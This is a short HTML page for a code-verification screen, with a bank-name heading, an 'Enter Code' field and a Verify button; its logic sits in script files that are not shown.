<html>

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Authenticate</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="styles.css" />
    <script src="https://kit.fontawesome.com/e2ac9cc532.js" crossorigin="anonymous"></script>
</head>

<body>
    <!--[if lt IE 7]>
      <p class="browsehappy">

    <div id="sign-up">
        <h1>
            <i class="fas fa-money-check-alt"></i>
        </h1>
        <h2 id="bankName"></h2>
        <form autocomplete="off" onkeydown="return event.key != 'Enter';">
            <fieldset>
                <label><i class="fas fa-lock"></i></label
          ><input
            type="text"
            autocomplete="off"
            placeholder="Enter Code"
            id="code"
          />
        </fieldset>
        <button type="button" id="verifyButton">Verify</button>
      </form>
      <img
        src="https://images.unsplash.com/photo-1550565118-3a14e8d0386f?ixlib=rb-1.2.1&auto=format&fit=crop&w=1050&q=80"
      />
    </div>
    <script src="variables.js"></script>

    <script src="verify.js" async defer></script>
  </body>
</html>
